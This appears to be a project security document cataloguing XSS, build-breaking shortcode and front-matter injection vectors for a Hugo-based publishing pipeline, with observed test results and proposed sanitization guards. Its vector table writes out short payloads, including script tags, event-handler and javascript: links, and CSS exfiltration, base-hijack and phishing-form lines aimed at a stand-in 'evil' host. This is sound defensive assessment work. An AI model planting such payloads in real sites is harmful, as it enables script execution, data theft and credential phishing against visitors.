# Dangerous constructs catalog

Catalog of potentially malicious constructs that can enter the pipeline via
Collectives markdown (or the manifest). It complements [FUCKUPPOTENTIALS.md](../FUCKUPPOTENTIALS.md)
(pipeline/operational hazards) by focusing on **content-level XSS and
build-environment RCE/DoS** vectors.

The live attack content lives in three example folders, each independently
postable via `./examples/post.sh <dir>`:

- `dangerous-xss/` - stored XSS / output injection (builds successfully).
- `dangerous-hugo-injection/` - build-time RCE / DoS probes (EXPECTED to fail).
- `dangerous-frontmatter/` - metadata-injection probes (builds successfully).

Current pipeline state these are assessed against:

- `markup.goldmark.renderer.unsafe = true` (raw HTML passes through) -
  [orchestrator/lib/site_builder.rb](../orchestrator/lib/site_builder.rb).
- Link render hook writes `href` verbatim and emits link text with `safeHTML` -
  [hugo-builder/theme/layouts/_default/_markup/render-link.html](../hugo-builder/theme/layouts/_default/_markup/render-link.html).
- No content sanitization anywhere.
- JSON front matter is written at the top of each generated file.
- `enableInlineShortcodes` is off (default).

"Expected" below is the predicted behavior; "Observed" is filled in from the
validation run (see the bottom of this file).

## Vector classes

| ID | Class | Construct (example) | Where it lands | Expected |
|----|-------|---------------------|----------------|----------|
| X1 | Script tag | `<script>alert(1)</script>` | output HTML | survives -> XSS |
| X2 | External script | `<script src=//evil/x.js>` | output HTML | survives -> XSS |
| X3 | SVG script | `<svg><script>...</script></svg>` | output HTML | survives -> XSS |
| X4 | Event handler | `<img src=x onerror=alert(1)>` | output HTML | survives -> XSS |
| X5 | Autofire handlers | `<svg onload>`, `<details ontoggle>`, `<input autofocus onfocus>` | output HTML | survives -> XSS |
| X6 | js: link (hook) | `[x](javascript:alert(1))` | render-link hook `href` | survives -> XSS on click |
| X7 | js: raw anchor | `<a href="javascript:...">` | output HTML | survives -> XSS on click |
| X8 | js: image | `![x](javascript:...)` | output HTML | survives (no-op img, but scheme passes) |
| X9 | data: document | `<img src="data:text/html;base64,...">`, `<iframe src="data:...">` | output HTML | survives |
| X10 | Entity-encoded scheme | `j&#97;vascript:` | output HTML | survives (defeats naive matching) |
| X11 | vbscript: | `<a href="vbscript:...">` | output HTML | survives (legacy) |
| X12 | Iframe | `<iframe src=... srcdoc=...>` | output HTML | survives -> framing/drive-by |
| X13 | object/embed | `<object data=...>`, `<embed src=...>` | output HTML | survives |
| X14 | Style block | `<style>...</style>` | output HTML | survives -> defacement |
| X15 | Remote stylesheet | `<link rel=stylesheet href=//evil>` | output HTML | survives |
| X16 | CSS exfiltration | `input[value^=a]{background:url(//evil)}` | output HTML | survives -> data leak |
| X17 | Meta refresh | `<meta http-equiv=refresh content=...>` | output HTML | survives -> redirect |
| X18 | Base hijack | `<base href=//evil/>` | output HTML | survives -> relative URL hijack |
| X19 | Form phishing | `<form action=//evil>...</form>` | output HTML | survives -> credential theft |
| X20 | Link-text injection | `[<img onerror=...>](https://x)` | hook `{{ .Text | safeHTML }}` | survives -> XSS |
| X21 | Reverse tabnabbing | non-http link opening new context | hook (no `rel=noopener`) | partial risk |
| R1 | Undefined shortcode | `{{< rce >}}`, `{{% include ... %}}` | Hugo build | build aborts (DoS) |
| R2 | Inline shortcode | `{{< x inline >}}{{ os.Getenv ... }}{{< /x >}}` | Hugo build | disabled -> error (safe) |
| R3 | Missing ref | `{{< ref "missing" >}}` | Hugo build | build aborts |
| R4 | Template literal | `{{ os.Getenv "X" }}` (no `<`/`%`) | output HTML | INERT, renders as text (safe) |
| R5 | Malformed HTML breaks minify | `<scr<script>ipt>alert(1)</script>` | Hugo `--minify` | build aborts (invalid JS in script body) -> DoS |
| F1 | YAML body override | leading `---` block | page body | rendered as `<hr>`/text, no override |
| F2 | TOML body override | leading `+++` block | page body | literal text, no override |
| F3 | JSON body override | leading `{...}` object | page body | literal text, no override |
| F4 | Title HTML injection | manifest `title` = `<script>...` | `.Title`/`.Site.Title` | auto-escaped by html/template |

## Out of scope here (handled elsewhere / pre-build)

- Path traversal in manifest `content` / upload paths (e.g. `../../etc/passwd`):
  rejected before Hugo by `sanitize_rel` in [orchestrator/app.rb](../orchestrator/app.rb)
  and `safe_join` in [orchestrator/lib/site_builder.rb](../orchestrator/lib/site_builder.rb).
  Not included as a renderable page because it would abort the upload (422), not
  produce output.
- Manifest depth / slug collisions / duplicate content paths / no Hugo timeout /
  pathological-markdown DoS: see [FUCKUPPOTENTIALS.md](../FUCKUPPOTENTIALS.md)
  items 2, 3, 4, 5, 7, 8.

## Candidate guards (future normalization step)

1. HTML sanitization allowlist on page bodies (strip `<script>`, `<style>`,
   `<iframe>`, `<object>`, `<embed>`, `<form>`, `<meta>`, `<base>`, `<link>`,
   all `on*` attributes, and `style=`).
2. URL scheme allowlist (http, https, mailto) in the render-link hook and during
   sanitization; drop `javascript:`/`data:`/`vbscript:` and entity-encoded
   variants; add `rel="noopener noreferrer"` whenever `target=_blank`.
3. Escape link text in the render-link hook (remove `safeHTML`) or sanitize it.
4. Neutralize/escape shortcode delimiters (`{{<`, `{{%`) in untrusted content
   before Hugo runs; keep `enableInlineShortcodes` off.
5. Strip/escape leading front-matter delimiters (`---`, `+++`, `{`) in bodies as
   defense-in-depth.
6. Serve output under a strict Content-Security-Policy.

## Observed (validation run)

Results from rendering each example against the current pipeline
(Hugo v0.162.1, `unsafe = true`, `--minify`). "Survives" = present and active in
the output HTML.

### dangerous-xss (build: OK)

- X1, X2, X3 (script tags incl. SVG): SURVIVE verbatim.
- X4, X5 (event handlers `onerror`/`onload`/`ontoggle`/`onfocus`): SURVIVE.
- X7 (raw `<a href="javascript:...">`): SURVIVES.
- X10 (entity-encoded `j&#97;vascript:` in a raw anchor): SURVIVES - the entity
  is decoded back to a working `javascript:` href.
- X11 (vbscript:): SURVIVES.
- X8/X9 (`javascript:`/`data:` in `<img src>`): SURVIVE in the attribute
  (non-executing for img, but the scheme is not stripped).
- X12, X13 (iframe/object/embed, incl. `srcdoc`, `data:`): SURVIVE.
- X14, X15, X16 (style block, remote stylesheet, CSS exfil): SURVIVE.
- X17, X18 (meta refresh, base hijack): SURVIVE.
- X19 (phishing form): SURVIVES.
- **X6 (markdown `[x](javascript:...)` via the render hook): NEUTRALIZED.** Go
  `html/template` URL-context autoescaping rewrites the href to `#ZgotmplZ`.
  This is better than predicted: the hook output IS contextually sanitized for
  the URL attribute, but only for links rendered through the hook - raw `<a>`
  HTML (X7) bypasses it.
- **X20 (HTML in link text via `{{ .Text | safeHTML }}`): NOT exploitable as
  written.** Goldmark escapes the inline HTML in the link-text node before the
  hook sees it, so the output shows `&lt;img ...` (escaped). `safeHTML` re-emits
  already-escaped text. Still worth fixing defensively.
- X21 (reverse tabnabbing): the hook adds `rel=noopener target=_blank` only for
  http/https; non-http schemes skip it (but those are usually neutralized/inert).

### dangerous-frontmatter (build: OK)

- F1, F2, F3 (leading `---`/`+++`/`{...}` in body): rendered as markdown
  (`<hr>` + literal text). No routing/metadata override; `HIJACKED VIA YAML`
  appears as body text. Mitigated by JSON-front-matter-first.
- F4 (HTML in manifest titles): ESCAPED. `<script>`/`<img onerror>` in page and
  site titles render as `&lt;script&gt;`/`&lt;img ...` in `<h1>`, `<title>`, and
  the sidebar (Hugo `html/template` auto-escaping). 0 raw `<script>` in output.

### dangerous-hugo-injection (build: FAILS, as designed -> HTTP 502)

- R1/R2/R3 (undefined shortcode, inline shortcode, missing ref): build aborts.
  Observed failure: `failed to extract shortcode: template for shortcode
  "secret-leak" not found` (inline shortcodes are disabled by default, so an
  inline attempt is treated as an undefined shortcode and errors - it does NOT
  execute). Any one breaker kills the whole job (DoS).
- R4 (bare `{{ ... }}`): inert by design (page bodies are not Go templates).
  Not separately rendered here because the sibling breakers abort the build;
  isolate `Hugo/Readme.md` + `Hugo/Template-Literals.md` in a manifest to see the
  literals pass through as text.
- R5 (malformed split `<script>` + `--minify`): aborts the build with an invalid-
  JS error (discovered while building `dangerous-xss`; moved out to keep that
  example buildable).

### Summary

Output-side XSS is wide open (raw HTML passes; only hook-rendered link hrefs and
template-escaped titles are protected). Build-side, the dangerous surface is
shortcode delimiters and minify-breaking malformed HTML (both DoS today, not RCE,
because inline shortcodes are off and page bodies are not templates). Guards #1-#6
above remain the recommended normalization step.
